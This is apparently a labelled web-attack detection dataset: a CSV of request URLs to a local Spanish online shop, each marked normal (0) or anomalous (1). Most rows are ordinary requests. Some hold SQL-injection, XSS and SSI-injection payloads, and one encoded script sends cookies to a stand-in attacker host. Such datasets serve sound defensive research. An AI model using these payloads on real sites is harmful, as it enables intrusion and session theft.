URL,Target
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=okai&password=3ra41&nombre=Custodio&apellidos=Hernandez+Agudelo&email=schiaftino%40showenvivo.com.sy&dni=49372725M&direccionA=Plza.+Olavide+47+13E&ciudad=Abejuela&cp=25551&provincia=Madrid&ntc=3180844936634002&B1=Registrar,1
http://localhost:8080/samples/gbook/query.htm,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=carli8&password=5im2n507&nombre=Jos%E9+Mar%EDa&apellidos=Vilageli+Bonet&email=baylor%40magichobby.sy&dni=80135662M&direccion=Calle+Estrella+Orion+190+&ciudad=Encinillas&cp=09681&provincia=Zaragoza&ntc=2558545383527310&B1=Registrar%2520,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/estilos.css/asf-logo-wide.gif,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2352&B1=Confirmar%253F,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mellisen&password=ATaCado&nombreA=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=hoehn&password=6ESTIla%24tORiO&nombre=Mahonri&apellidos=Cunat+Amenta&email=roco%40forohh.ge&dni=69346006V&direccion=Plaza+Luis+Pombo%2C+S%2FN+9%3FG&ciudad=Baix+Pallars&cp=43761&provincia=Lleida&ntc=9176775896982100&B1=Registrar,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=stewart&password=arRE&nombre=Ilday&apellidos=Tunaroza+Capmany&email=mackenna.papac%40interpretacion-diccionario-y-significado-de-los-s&dni=23991331P&direccion=Moneyba%2C+114+&ciudad=Rocafort+de+Queralt&cp=06260&provincia=Palencia&ntc=3554407381877328&B1=Registrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1.old,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=4564&B1=Confirmar,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=jenner&password=8374f09a2&nombre=Queila&apellidos=Brun+Canalis&email=temple%40fernandosoto.ch&dni=77300409P&direccion=Calle+Campo+Charro%2C+89%2C+&ciudad=Leiro&cp=16878&provincia=Le%F3n&ntc=6079560291532789&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=shanti&password=1nter%2Fez&nombre=Meyer&apellidos=Balsells+Fit%E9&email=meeker_komorowska%40noviasteresapalacios.mx&dni=19254444V&direccion=Calle+Santo+Domingo%2C+163+&ciudad=Lapoblaci%F3n&cp=43762&provincia=Salamanca&ntc=3963417251339822&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registrosessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&login=calley&password=posTIfijO&nombre=Naiara&apellidos=Baldo+Urra&email=wildhagen_cavender%40hotelestopsecret.kp&dni=91334515C&direccion=Calle+En+Corts+130%2C+2%3FA&ciudad=Jaul%EDn&cp=04280&provincia=%C1vila&ntc=4540479003454435&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080.Bak,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=c%2Farleen&pwd=v76c088rA&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg~,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/4861362529278789730,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kovacs&password=4u9_l5o&nombre=Salustio&apellidos=Orus+Pati%F1o&email=gillespie%40deuxmanagement.web&dni=78901606Z&direccion=Gregoria+Hernandez+67%2C+13G&ciudad=Ba%F1os+de+Ebro%2FMa%F1ueta&cp=08739&provincia=Guadalajara&ntc=8702699962501028&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=darn&password=56rP10a4&nombre=Ravi&apellidos=Morell&email=costa_lejeune%40clichotel.my&dni=16929821G&direccion=Ingeniero+Mari%F1o%2C+170+10-A&ciudad=Parets+del+Vall%E8s&cp=20577&provincia=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&ntc=7457334236490109&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=276&B1=Confirmar,1
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=mcnair&pwd=81cob6r&remember=off&B1A=Entrar,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/global/estilos.css.Old,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4135&B1=Confirmar%2F,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080.bak,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=22&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=%4040&cantidad=95&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=presson&password=atractivo&nombre=Yolanda&apellidos=Garabana+Belart&email=marmont_doran%40peliculasen3d.ng&dni=66339533N&direccion=C%2F+Antonio+Gonzalez+Suarez%2C+44%2C+11%3FC&ciudad=Castellser%E0&cp=50430&provincia=Teruel&ntc=2503735497393534&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=473&B1A=Pasar+por+caja,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6432&B1=Confirmar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=bao&passwordA=val%ED&nombre=Norberta&apellidos=Poller+Saravia&email=kolesar5%40ratzapper.cl&dni=12690729L&direccion=C%2F+Valls+30%2C+10-F&ciudad=Luciana&cp=02316&provincia=Salamanca&ntc=0204088681426033&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=symen&pwd=6.r9b05o&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100%2F&cantidad=47&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Confirmar,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/asf-logo-wide,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/global/menum.jsp/~,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=mcready&pwd=%2Bad7quie7&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1633&B1=Confirmar%2F,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=201&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=papp&password=bausana&nombre=Oberto&apellidos=Jofre+Slenk&email=szmidt%40surcosur.id&dni=03228451X&direccion=Calle+Wenceslao+Argumosa%2C+118%2C+&ciudadA=Les&cp=26130&provincia=Valencia&ntc=9156094393760997&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gerhardt8&password=pizmie%2Bnta&nombre=Yamila&apellidos=Cardalliaguet+Yescas&email=armantel%40laspruebascongaseosa.vg&dni=65724136A&direccion=Castro+Canseco+8+5%3FH&ciudad=Oria&cp=4351A&provincia=Albacete&ntc=2877016523183053&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=8384&B1=Confirmar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=gantt&password=sae19r8&nombre=Libe&apellidos=Amusquivar&email=mccormack%40neotelecom.tn&dni=35453403F&direccion=Calle+Tamarindo%2C+118+&ciudad=Cabre%3Fros*+del+Monte&cp=25400&provincia=Madrid&ntc=5272129392938090&B1=Registrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6382&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Vino+Rioja&precio=39&cantidad=76&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp.INC,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/~,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=32&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidadA=21&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=AND+1%3D1&B1=Confirmar,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dionysia&password=27c01a&nombre=Narella&apellidos=Desplans&email=fowley5%40virginislands.com.eg&dni=64633352V&direccion=Calle+Cerrada%2C+94%2C+&ciudad=Tiana&cp=49322&provincia=Guadalajara&ntc=8119845903210996&B1=Registrar,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4760&B1=Confirmar,0
http://localhost:8080/webapp/examples/verify,1
http://localhost:8080/mail.box,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=grueneic&password=peraltar&nombre=Cenobia&apellidos=Elizarzu+Aguilocho&email=akashi1%40g-audio.td&dni=12796200N&direccion=Calle+Marsella+S%2FN%2C+&ciudad=Benidorm&cp=18708&provincia=Barcelona&ntc=8624528544448425&B1=Registrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=upchurch&password=Plut%F358_C5&nombre=Cruz&apellidos=Berengel+Artigas&email=la%40neuville.farbrother%40suecas.co%40%40m.fi&dni=61007775E&direccion=Aromo+199%2C+&ciudad=Poliny%E0&cp=37779&provincia=Soria&ntc=1707059496067990&B1=Registrar,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=baheya&password=pOlvo&nombre=Shannen&apellidos=Fonterosa+V%E9jar&email=mccollon%40irmedia.ca&dni=14399392N&direccion=Calle+Arriola+29%2C+&ciudad=Armenteros&cp=08580&provincia=Guadalajara&ntc=5706258775201783&B1=Registrar,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=18&B1=A%F1adir+al+carrito%252B,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7173&B1=Confirmar,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=elex&password=c.%E10C4R1&nombre=Amelio&apellidos=Fontanal+Callarisa&email=versini%40clubdecampo.com.bi&dni=37655511A&direccion=C%2F+Calzada+169+&ciudad=Santany%ED&cp=14139&provincia=Alicante&ntc=0854278659322549&B1=Registrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=tudor&password=28a2quizo&nombre=Camilo&apellidos=Eremian+De+la+Sota&email=lauterbach%40nanogenerador.ic&dni=24061408G&direccion=Call%2Be+El+Rincon+69+&ciudad=Ciudad+Real&cp=08553&provincia=Badajoz&ntc=5945196331395771&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=32&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carritobob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/asf-logo-wide.gif/.Bak,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=%27+AND+%271%27%3D%271&login=cinderel&password=rel%2Bigionario&nombre=Kenneth&apellidos=Hijodalgo+Formiga&email=gil-botelho%40miami-beach.com.info&dni=81551229Z&direccion=El+Arquero%2C+143%2C+1%3FD&ciudad=Amurrio&cp=37170&provincia=Segovia&ntc=8326601768414043&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=boyajian&password=sERviola&nombre=Rut&apellidos=D%2Curazo+Buf%ED&email=gleaves4%40mauroman.ml&dni=93721450S&direccion=Escritor+Gomez+De+Rivera%2C+191+&ciudad=Legutiano&cp=09119&provincia=C%E1ceres&ntc=9325877908605374&B1=Registrar,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/productos.jsp/asf-logo-wide.inc,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6450&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=810&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=64&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7730&B1=%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,1
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
